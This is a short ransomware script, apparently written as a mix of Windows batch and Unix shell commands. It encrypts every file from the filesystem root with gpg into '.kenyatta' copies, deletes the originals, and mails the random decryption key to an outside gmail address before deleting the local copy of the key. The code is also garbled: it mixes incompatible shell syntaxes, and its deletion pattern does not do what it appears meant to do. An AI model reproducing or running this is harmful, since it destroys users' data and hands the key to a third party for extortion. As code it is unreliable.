SET email_address "speakerwoman842@gmail.com"
gpg --gen-random -a 0 20 > passphrase.txt
SET /p passphrase=<passphrase.txt
find / -type f -exec gpg --symmetric --passphrase %passphrase% --output "{}.kenyatta" "{}" \;
find / -type f -name "*[!kenyatta]" -delete
echo "The decryption key for the encrypted files is: %passphrase%" | mail -s "Decryption Key" %email_address%
DEL /Q /F passphrase.txt